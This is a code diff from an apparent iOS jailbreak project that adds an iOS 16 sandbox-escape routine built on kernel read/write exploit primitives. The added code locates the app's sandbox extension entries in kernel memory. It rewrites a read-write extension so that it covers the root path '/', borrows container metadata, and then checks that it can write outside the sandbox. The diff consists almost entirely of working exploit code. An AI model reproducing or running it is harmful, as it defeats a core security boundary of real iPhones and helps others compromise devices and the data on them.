@@ -6,6 +6,13 @@
 //
 
 #import <Foundation/Foundation.h>
+#import <dirent.h>
+#import <dlfcn.h>
+#import <fcntl.h>
+#import <limits.h>
+#import <stdlib.h>
+#import <string.h>
+#import <unistd.h>
 #import <sys/mount.h>
 #import <sys/stat.h>
 
@@ -19,11 +26,306 @@
 #import "../kexploit/kexploit_opa334.h"
 
 
+#define CY_IOS16_KRW_LEN 0x20
+#define CY_IOS16_OFF_SANDBOX_EXT_TABLE 0x08
+#define CY_IOS16_OFF_SANDBOX_EXT_SET   0x10
+#define CY_IOS16_OFF_EXT_DATA          0x40
+#define CY_IOS16_OFF_EXT_DATALEN       0x48
+#define CY_IOS16_OFF_EXT_META          0x50
+#define CY_IOS16_BUCKET_COUNT          18
+#define CY_IOS16_TARGET_PATH           "/"
+
+static BOOL cyanide_is_ios16(void)
+{
+    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
+    return version.majorVersion == 16;
+}
+
+static bool cy_ios16_kptr(uint64_t ptr)
+{
+    return is_kaddr_valid(ptr);
+}
+
+static bool cy_ios16_write64_in_block(uint64_t addr, uint64_t value)
+{
+    uint64_t base = addr & ~(uint64_t)(CY_IOS16_KRW_LEN - 1);
+    uint64_t off = addr - base;
+    if (off + sizeof(uint64_t) > CY_IOS16_KRW_LEN) return false;
+
+    uint8_t buf[CY_IOS16_KRW_LEN];
+    kreadbuf(base, buf, CY_IOS16_KRW_LEN);
+    *(uint64_t *)(buf + off) = value;
+    kwrite_zone_element(base, buf, CY_IOS16_KRW_LEN);
+    return true;
+}
+
+static bool cy_ios16_class_name_is(uint64_t class_ptr, const char *expected)
+{
+    if (!cy_ios16_kptr(class_ptr) || !expected) return false;
+
+    size_t len = strlen(expected);
+    if (len > 32) len = 32;
+
+    char got[33] = {0};
+    for (size_t off = 0; off < len; off += sizeof(uint64_t)) {
+        uint64_t q = kread64(class_ptr + off);
+        size_t n = len - off;
+        if (n > sizeof(uint64_t)) n = sizeof(uint64_t);
+        memcpy(got + off, &q, n);
+    }
+    return memcmp(got, expected, len) == 0;
+}
+
+static bool cy_ios16_class_name_known(uint64_t class_ptr)
+{
+    return cy_ios16_class_name_is(class_ptr, "com.apple.sandbox.container") ||
+           cy_ios16_class_name_is(class_ptr, "com.apple.sandbox.executable") ||
+           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read") ||
+           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read-write") ||
+           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.write");
+}
+
+static bool cy_ios16_ext_table_looks_valid(uint64_t table)
+{
+    if (!cy_ios16_kptr(table)) return false;
+
+    for (int bucket = 0; bucket < CY_IOS16_BUCKET_COUNT; bucket++) {
+        uint64_t node = kread_ptr(table + (uint64_t)bucket * sizeof(uint64_t));
+        for (int depth = 0; depth < 8 && cy_ios16_kptr(node); depth++) {
+            uint64_t next_node = kread_ptr(node);
+            uint64_t ext = kread_ptr(node + 0x08);
+            uint64_t class_ptr = kread_ptr(node + 0x10);
+            if (cy_ios16_class_name_known(class_ptr) && cy_ios16_kptr(ext)) {
+                uint64_t path = kread_ptr(ext + CY_IOS16_OFF_EXT_DATA);
+                uint64_t len = kread64(ext + CY_IOS16_OFF_EXT_DATALEN);
+                if (cy_ios16_kptr(path) && len > 0 && len < PATH_MAX) return true;
+            }
+            if (!next_node || next_node == node) break;
+            node = next_node;
+        }
+    }
+    return false;
+}
+
+static uint64_t cy_ios16_extension_table(uint64_t sandbox)
+{
+    uint64_t table = kread_ptr(sandbox + CY_IOS16_OFF_SANDBOX_EXT_TABLE);
+    if (cy_ios16_ext_table_looks_valid(table)) return table;
+
+    table = kread_ptr(sandbox + CY_IOS16_OFF_SANDBOX_EXT_SET);
+    if (cy_ios16_ext_table_looks_valid(table)) return table;
+
+    return 0;
+}
+
+static char *cy_ios16_issue_token(const char *extension_class, const char *path)
+{
+    if (!extension_class || !path) return NULL;
+
+    void *h = dlopen("libsandbox.dylib", RTLD_NOW);
+    if (!h) h = dlopen("/usr/lib/libsandbox.dylib", RTLD_NOW);
+    if (!h) return NULL;
+
+    typedef char *(*issue_file_t)(const char *, const char *, int);
+    typedef void (*free_token_t)(char *);
+
+    issue_file_t issue_to_self = (issue_file_t)dlsym(h, "sandbox_extension_issue_file_to_self");
+    issue_file_t issue_file = (issue_file_t)dlsym(h, "sandbox_extension_issue_file");
+
+    char *token = issue_to_self ? issue_to_self(extension_class, path, 0) : NULL;
+    if (!token && issue_file) token = issue_file(extension_class, path, 0);
+    if (!token) return NULL;
+
+    char *copy = strdup(token);
+    free_token_t free_token = (free_token_t)dlsym(h, "sandbox_extension_free");
+    if (free_token) free_token(token);
+    else free(token);
+    return copy;
+}
+
+static int64_t cy_ios16_seed_path(NSString *path)
+{
+    if (path.length == 0) return -1;
+
+    const char *classes[] = {
+        "com.apple.app-sandbox.read-write",
+        "com.apple.app-sandbox.read",
+        "com.apple.app-sandbox.write",
+    };
+
+    const char *cpath = path.fileSystemRepresentation;
+    for (size_t i = 0; i < sizeof(classes) / sizeof(classes[0]); i++) {
+        char *token = cy_ios16_issue_token(classes[i], cpath);
+        if (!token) continue;
+
+        int64_t handle = sandbox_extension_consume(token);
+        free(token);
+        return handle;
+    }
+    return -1;
+}
+
+static int64_t cy_ios16_seed_probe(void)
+{
+    @autoreleasepool {
+        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docs = dirs.firstObject ?: NSHomeDirectory();
+        NSString *probe = [docs stringByAppendingPathComponent:@"cyanide-sbx-probe"];
+        if (probe.length == 0) return -1;
+
+        [NSFileManager.defaultManager createDirectoryAtPath:probe
+                                withIntermediateDirectories:YES
+                                                 attributes:nil
+                                                      error:nil];
+        return cy_ios16_seed_path(probe);
+    }
+}
+
+static bool cy_ios16_find_extension(uint64_t sandbox, const char *class_name, int64_t handle, bool any_handle, uint64_t *out_ext)
+{
+    if (out_ext) *out_ext = 0;
+    uint64_t table = cy_ios16_extension_table(sandbox);
+    if (!cy_ios16_kptr(table)) return false;
+
+    for (int bucket = 0; bucket < CY_IOS16_BUCKET_COUNT; bucket++) {
+        uint64_t node = kread_ptr(table + (uint64_t)bucket * sizeof(uint64_t));
+        for (int node_depth = 0; node_depth < 8 && cy_ios16_kptr(node); node_depth++) {
+            uint64_t next_node = kread_ptr(node);
+            uint64_t ext = kread_ptr(node + 0x08);
+            uint64_t class_ptr = kread_ptr(node + 0x10);
+            if (cy_ios16_class_name_is(class_ptr, class_name)) {
+                for (int ext_depth = 0; ext_depth < 8 && cy_ios16_kptr(ext); ext_depth++) {
+                    uint64_t next_ext = kread_ptr(ext);
+                    uint64_t ext_handle = kread64(ext + 0x08);
+                    if (any_handle || (int64_t)ext_handle == handle) {
+                        if (out_ext) *out_ext = ext;
+                        return true;
+                    }
+                    if (!next_ext || next_ext == ext) break;
+                    ext = next_ext;
+                }
+            }
+            if (!next_node || next_node == node) break;
+            node = next_node;
+        }
+    }
+    return false;
+}
+
+static bool cy_ios16_path_has_prefix(uint64_t addr, const char *prefix)
+{
+    if (!cy_ios16_kptr(addr) || !prefix) return false;
+
+    size_t len = strlen(prefix);
+    char got[PATH_MAX] = {0};
+    if (len >= sizeof(got)) return false;
+
+    for (size_t off = 0; off < len; off += sizeof(uint64_t)) {
+        uint64_t q = kread64(addr + off);
+        size_t n = len - off;
+        if (n > sizeof(uint64_t)) n = sizeof(uint64_t);
+        memcpy(got + off, &q, n);
+    }
+    return memcmp(got, prefix, len) == 0;
+}
+
+static bool cy_ios16_set_extension_path(uint64_t ext, const char *target)
+{
+    uint64_t path = kread_ptr(ext + CY_IOS16_OFF_EXT_DATA);
+    if (!cy_ios16_kptr(path) || !target) return false;
+
+    uint64_t target_len = (uint64_t)strlen(target);
+    uint64_t first = path & ~(uint64_t)(CY_IOS16_KRW_LEN - 1);
+    uint64_t end = path + target_len + 1;
+    if (!cy_ios16_kptr(first)) return false;
+
+    for (uint64_t base = first; base < end; base += CY_IOS16_KRW_LEN) {
+        uint8_t block[CY_IOS16_KRW_LEN];
+        kreadbuf(base, block, CY_IOS16_KRW_LEN);
+        for (uint64_t addr = base; addr < base + CY_IOS16_KRW_LEN; addr++) {
+            if (addr < path || addr >= end) continue;
+            uint64_t idx = addr - path;
+            block[addr - base] = (idx < target_len) ? (uint8_t)target[idx] : 0;
+        }
+        kwrite_zone_element(base, block, CY_IOS16_KRW_LEN);
+    }
+
+    return cy_ios16_write64_in_block(ext + CY_IOS16_OFF_EXT_DATALEN, target_len) &&
+           kread64(ext + CY_IOS16_OFF_EXT_DATALEN) == target_len &&
+           cy_ios16_path_has_prefix(path, target);
+}
+
+static bool cy_ios16_test_root_access(void)
+{
+    DIR *dir = opendir(CY_IOS16_TARGET_PATH);
+    if (dir) closedir(dir);
+
+    const char *testPath = "/private/var/mobile/Library/Preferences/cyanide-sbx-access.txt";
+    int fd = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    if (fd < 0) return false;
+
+    const char marker[] = "cyanide-sbx-test\n";
+    ssize_t written = write(fd, marker, sizeof(marker) - 1);
+    close(fd);
+    int unlinked = unlink(testPath);
+    return dir != NULL && written == (ssize_t)(sizeof(marker) - 1) && unlinked == 0;
+}
+
+static int cy_ios16_patch_sandbox_ext(void)
+{
+    uint64_t self_proc = proc_self();
+    if (!self_proc) return -1;
+
+    uint64_t label = proc_get_cred_label(self_proc);
+    uint64_t sandbox = label_get_sandbox(label);
+    if (!cy_ios16_kptr(sandbox)) return -1;
+
+    int64_t probe_handle = cy_ios16_seed_probe();
+    if (probe_handle < 0) {
+        printf("[SANDBOX] iOS16 escape failed: no probe extension\n");
+        return -1;
+    }
+
+    uint64_t probe_ext = 0;
+    uint64_t container_ext = 0;
+    if (!cy_ios16_find_extension(sandbox, "com.apple.app-sandbox.read-write", probe_handle, false, &probe_ext) ||
+        !cy_ios16_kptr(probe_ext)) {
+        printf("[SANDBOX] iOS16 escape failed: probe extension not found\n");
+        return -1;
+    }
+    if (!cy_ios16_find_extension(sandbox, "com.apple.sandbox.container", 0, true, &container_ext) ||
+        !cy_ios16_kptr(container_ext)) {
+        printf("[SANDBOX] iOS16 escape failed: container extension not found\n");
+        return -1;
+    }
+
+    if (!cy_ios16_write64_in_block(probe_ext + CY_IOS16_OFF_EXT_DATALEN, 1))
+        return -1;
+
+    uint64_t container_meta = kread64(container_ext + CY_IOS16_OFF_EXT_META);
+    if (!cy_ios16_write64_in_block(probe_ext + CY_IOS16_OFF_EXT_META, container_meta))
+        return -1;
+
+    if (!cy_ios16_set_extension_path(probe_ext, CY_IOS16_TARGET_PATH))
+        return -1;
+
+    if (!cy_ios16_test_root_access()) {
+        printf("[SANDBOX] iOS16 escape verification failed\n");
+        return -1;
+    }
+
+    printf("[SANDBOX] iOS16 escape succeeded\n");
+    return 0;
+}
+
 // The original idea is from https://x.com/CrazyMind90/status/2040484080622465056
 // Kudos to CrazyMind90 for revealing new sbx escape technique!
 // This is almost same behavior with sandbox_extension_consume with r/w on root
 // Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
 int patch_sandbox_ext(void) {
+    if (cyanide_is_ios16())
+        return cy_ios16_patch_sandbox_ext();
+
     uint64_t label = proc_get_cred_label(proc_self());
     uint64_t sbx = label_get_sandbox(label);
     struct sandbox_label sbx_lbl = {0};
